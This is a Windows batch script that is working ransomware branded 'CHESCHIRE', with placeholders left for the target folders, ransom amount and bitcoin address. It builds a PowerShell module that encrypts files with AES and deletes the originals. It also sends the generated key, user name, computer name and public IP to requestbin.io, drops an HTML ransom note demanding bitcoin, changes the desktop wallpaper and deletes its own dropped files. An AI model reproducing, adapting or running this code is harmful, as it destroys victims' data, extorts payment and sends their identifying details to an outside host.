@echo off

cd %APPDATA%
start program_name

mkdir %USERPROFILE%\Documents\WindowsPowerShell\Modules\Cipher
cd %USERPROFILE%\Documents\WindowsPowerShell\Modules\Cipher

echo function New-CryptographyKey() { > Cipher.psm1
echo [CmdletBinding()] >> Cipher.psm1
echo [OutputType([System.Security.SecureString])] >> Cipher.psm1
echo [OutputType([String], ParameterSetName='PlainText')] >> Cipher.psm1
echo Param([Parameter(Mandatory=$false, Position=1)] >> Cipher.psm1
echo [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')] >> Cipher.psm1
echo [String]$Algorithm='AES', >> Cipher.psm1
echo [Parameter(Mandatory=$false, Position=2)] >> Cipher.psm1
echo [Int]$KeySize, >> Cipher.psm1
echo [Parameter(ParameterSetName='PlainText')] >> Cipher.psm1
echo [Switch]$AsPlainText) >> Cipher.psm1
echo Process { >> Cipher.psm1
echo try { >> Cipher.psm1
echo $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm) >> Cipher.psm1
echo if($PSBoundParameters.ContainsKey('KeySize')) { >> Cipher.psm1
echo $Crypto.KeySize = $KeySize >> Cipher.psm1
echo } >> Cipher.psm1
echo $Crypto.GenerateKey() >> Cipher.psm1
echo if($AsPlainText) { >> Cipher.psm1
echo return [System.Convert]::ToBase64String($Crypto.Key) >> Cipher.psm1
echo } >> Cipher.psm1
echo else { >> Cipher.psm1
echo return [System.Convert]::ToBase64String($Crypto.Key) ^| ConvertTo-SecureString -AsPlainText -Force >> Cipher.psm1
echo } >> Cipher.psm1
echo } >> Cipher.psm1
echo catch { Write-Error $_ } >> Cipher.psm1
echo } >> Cipher.psm1
echo } >> Cipher.psm1
echo Function Protect-File { >> Cipher.psm1
echo [CmdletBinding(DefaultParameterSetName='SecureString')] >> Cipher.psm1
echo [OutputType([System.IO.FileInfo[]])] >> Cipher.psm1
echo Param( >> Cipher.psm1
echo [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)] >> Cipher.psm1
echo [Alias('PSPath','LiteralPath')] >> Cipher.psm1
echo [String[]]$FileName, >> Cipher.psm1
echo [Parameter(Mandatory=$false, Position=2)] >> Cipher.psm1
echo [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')] >> Cipher.psm1
echo [String]$Algorithm = 'AES', >> Cipher.psm1
echo [Parameter(Mandatory=$false, Position=3, ParameterSetName='SecureString')] >> Cipher.psm1
echo [System.Security.SecureString]$Key = (New-CryptographyKey -Algorithm $Algorithm), >> Cipher.psm1
echo [Parameter(Mandatory=$true, Position=3, ParameterSetName='PlainText')] >> Cipher.psm1
echo [String]$KeyAsPlainText, >> Cipher.psm1
echo [Parameter(Mandatory=$false, Position=4)] >> Cipher.psm1
echo [System.Security.Cryptography.CipherMode]$CipherMode, >> Cipher.psm1
echo [Parameter(Mandatory=$false, Position=5)] >> Cipher.psm1
echo [System.Security.Cryptography.PaddingMode]$PaddingMode, >> Cipher.psm1
echo [Parameter(Mandatory=$false, Position=6)] >> Cipher.psm1
echo [String]$Suffix = ".$Algorithm", >> Cipher.psm1
echo [Parameter()] >> Cipher.psm1
echo [Switch]$RemoveSource >> Cipher.psm1
echo ) >> Cipher.psm1
echo Begin { >> Cipher.psm1
echo try { >> Cipher.psm1
echo if($PSCmdlet.ParameterSetName -eq 'PlainText') { >> Cipher.psm1
echo $Key = $KeyAsPlainText ^| ConvertTo-SecureString -AsPlainText -Force >> Cipher.psm1
echo }  >> Cipher.psm1
echo $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key) >> Cipher.psm1
echo $EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)) >> Cipher.psm1
echo $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm) >> Cipher.psm1
echo if($PSBoundParameters.ContainsKey('CipherMode')){ >> Cipher.psm1
echo $Crypto.Mode = $CipherMode >> Cipher.psm1
echo } >> Cipher.psm1
echo if($PSBoundParameters.ContainsKey('PaddingMode')){ >> Cipher.psm1
echo $Crypto.Padding = $PaddingMode >> Cipher.psm1
echo } >> Cipher.psm1
echo $Crypto.KeySize = $EncryptionKey.Length*8 >> Cipher.psm1
echo $Crypto.Key = $EncryptionKey  >> Cipher.psm1
echo } >> Cipher.psm1
echo Catch { Write-Error $_ -ErrorAction Stop } >> Cipher.psm1
echo } >> Cipher.psm1
echo Process { >> Cipher.psm1
echo $Files = Get-Item -LiteralPath $FileName >> Cipher.psm1
echo ForEach($File in $Files) {  >> Cipher.psm1
echo $DestinationFile = $File.FullName + $Suffix >> Cipher.psm1
echo Try { >> Cipher.psm1
echo $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open) >> Cipher.psm1
echo $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create) >> Cipher.psm1
echo $Crypto.GenerateIV()  >> Cipher.psm1
echo $FileStreamWriter.Write([System.BitConverter]::GetBytes($Crypto.IV.Length), 0, 4) >> Cipher.psm1
echo $FileStreamWriter.Write($Crypto.IV, 0, $Crypto.IV.Length) >> Cipher.psm1
echo $Transform = $Crypto.CreateEncryptor() >> Cipher.psm1
echo $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write) >> Cipher.psm1
echo $FileStreamReader.CopyTo($CryptoStream) >> Cipher.psm1
echo $CryptoStream.FlushFinalBlock() >> Cipher.psm1
echo $CryptoStream.Close() >> Cipher.psm1
echo $FileStreamReader.Close() >> Cipher.psm1
echo $FileStreamWriter.Close() >> Cipher.psm1
echo if($RemoveSource){ >> Cipher.psm1
echo Remove-Item -LiteralPath $File.FullName >> Cipher.psm1
echo } >> Cipher.psm1
echo $result = Get-Item $DestinationFile >> Cipher.psm1
echo $result ^| Add-Member -MemberType NoteProperty -Name SourceFile -Value $File.FullName >> Cipher.psm1
echo $result ^| Add-Member -MemberType NoteProperty -Name Algorithm -Value $Algorithm >> Cipher.psm1
echo $result ^| Add-Member -MemberType NoteProperty -Name Key -Value $Key >> Cipher.psm1
echo $result ^| Add-Member -MemberType NoteProperty -Name CipherMode -Value $Crypto.Mode >> Cipher.psm1
echo $result ^| Add-Member -MemberType NoteProperty -Name PaddingMode -Value $Crypto.Padding >> Cipher.psm1
echo $result >> Cipher.psm1
echo } >> Cipher.psm1
echo Catch { >> Cipher.psm1
echo Write-Error $_ >> Cipher.psm1
echo If($FileStreamWriter) { >> Cipher.psm1
echo $FileStreamWriter.Close() >> Cipher.psm1
echo Remove-Item -LiteralPath $DestinationFile -Force >> Cipher.psm1
echo } >> Cipher.psm1
echo Continue >> Cipher.psm1
echo } >> Cipher.psm1
echo Finally {  >> Cipher.psm1
echo if($CryptoStream){ >> Cipher.psm1
echo $CryptoStream.Close() >> Cipher.psm1
echo } >> Cipher.psm1
echo if($FileStreamReader){ >> Cipher.psm1
echo $FileStreamReader.Close() >> Cipher.psm1
echo } >> Cipher.psm1
echo if($FileStreamWriter){ >> Cipher.psm1
echo $FileStreamWriter.Close() >> Cipher.psm1
echo } >> Cipher.psm1
echo } >> Cipher.psm1
echo } >> Cipher.psm1
echo } >> Cipher.psm1
echo } >> Cipher.psm1

set id=%RANDOM%-%RANDOM%-%RANDOM%

echo $code1 = -join ((48..57) + (97..122) ^| Get-Random -Count 22 ^| %% {[char]$_}) > cry.ps1
echo $code2 = -join ((48..57) + (97..122) ^| Get-Random -Count 21 ^| %% {[char]$_}) >> cry.ps1
echo $secretkey = $code1 + $code2 + "=" >> cry.ps1
echo $date = Get-Date -Format "dddd_dd/MM/yyyy_HH:mm" >> cry.ps1
echo $user = $env:UserName >> cry.ps1
echo $computername = $env:ComputerName >> cry.ps1
echo $ip = (Invoke-WebRequest -UseBasicParsing -Uri "http://ifconfig.me/ip").Content >> cry.ps1
echo $DataEncode = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("%id%_" + $secretkey + "_" + $date + "_" + $user + "_" + $computername + "_" + $ip)) >> cry.ps1
echo (New-Object System.Net.WebClient).DownloadString("http://requestbin.io/link_bin?" + $DataEncode) >> cry.ps1
echo Import-Module Cipher >> cry.ps1
echo $files = get-childitem folder_location -recurse -Include list_extension ^| where {^! $_.PSIsContainer} >> cry.ps1
echo foreach ($file in $files) { Protect-File $file -Algorithm AES -KeyAsPlainText $secretkey -Suffix 'cryExtension' -RemoveSource } >> cry.ps1
echo Remove-Item -path $home\Documents\WindowsPowerShell\Modules\Cipher\* >> cry.ps1

cd %USERPROFILE%\Documents\WindowsPowerShell\Modules\Cipher
powershell -ExecutionPolicy Bypass -File cry.ps1

cd %USERPROFILE%\Desktop
echo ^<!DOCTYPE html^> > readme.html
echo ^<html^> >> readme.html
echo ^<head^> >> readme.html
echo ^<meta charset="UTF-8"^> >> readme.html
echo ^<link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Cadenas-ferme-rouge.svg/1024px-Cadenas-ferme-rouge.svg.png"^> >> readme.html
echo ^<title^>CHESCHIRE^</title^> >> readme.html
echo ^</head^> >> readme.html
echo ^<body^> >> readme.html
echo ^<h1^>CHESCHIRE^</h1^> >> readme.html
echo ^<h2^>How to recover my data ?^</h2^> >> readme.html
echo ^<section^> >> readme.html
echo ^<ul^> >> readme.html
echo ^<li^>YOUR PERSONAL FILES HAVE BEEN ^<b^>ENCRYPTED^</b^> by CHESCHIRE with the AES-256 bits encryption algorithm.^<br/^>^<br/^>^</li^> >> readme.html
echo ^<li^>Send ^<b^>ransom_amount^</b^> worth of bitcoin to this address ^<b^>bitcoin_id^</b^>^<br/^>^<br/^>^</li^> >> readme.html
echo ^<li^>Then send an email to ^<a href="mailto:email_rescue"^>email_rescue^</a^> and specify your ID to receive the decryption key for your data. >> readme.html
echo ^<br/^>To decrypt, use 'decrypt0r.exe' on your desktop.^<br/^>^<br/^>^</li^> >> readme.html
echo ^<li^>Your ID: ^<b^>%id%^</b^>^</li^> >> readme.html
echo ^</ul^> >> readme.html
echo ^</section^> >> readme.html
echo ^</body^> >> readme.html
echo ^</html^> >> readme.html
echo ^<style^> >> readme.html
echo html{ >> readme.html
echo background-color: black; >> readme.html
echo } >> readme.html
echo img{ >> readme.html
echo display: block; >> readme.html
echo margin-left: auto; >> readme.html
echo margin-right: auto; >> readme.html
echo } >> readme.html
echo h1{ >> readme.html
echo color: #ed5434; >> readme.html
echo text-align: center; >> readme.html
echo text-decoration: none; >> readme.html
echo font-family: "Times New Roman", Times, serif; >> readme.html
echo font-size: 3em; >> readme.html
echo } >> readme.html
echo h2{ >> readme.html
echo color: #ed5434; >> readme.html
echo text-align: center; >> readme.html
echo text-decoration: none; >> readme.html
echo font-family: FreeMono, monospace; >> readme.html
echo font-size: 2em; >> readme.html
echo font-weight: bold; >> readme.html
echo } >> readme.html
echo section{ >> readme.html
echo background-color: red; >> readme.html
echo color: white; >> readme.html
echo width: 80%%; >> readme.html
echo height: auto; >> readme.html
echo margin: auto; >> readme.html
echo padding: 10px; >> readme.html
echo font-family: FreeMono, monospace; >> readme.html
echo font-size: 1.1em; >> readme.html
echo } >> readme.html
echo section ^> ul ^> li ^> a{ >> readme.html
echo text-decoration: underline; >> readme.html
echo color: white; >> readme.html
echo font-weight: bold; >> readme.html
echo } >> readme.html
echo ^</style^> >> readme.html

start %USERPROFILE%\Desktop\readme.html

copy %APPDATA%\decrypt0r.exe %USERPROFILE%\Desktop\

powershell iwr -Uri $env:APPDATA\wallpaper_file -OutFile c:\windows\temp\b.jpg;sp 'HKCU:Control Panel\Desktop' WallPaper 'c:\windows\temp\b.jpg';$a=1;do{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}while($a++-le59)

del %APPDATA%\program_name
del %APPDATA%\wallpaper_file
del %APPDATA%\decrypt0r.exe

exit
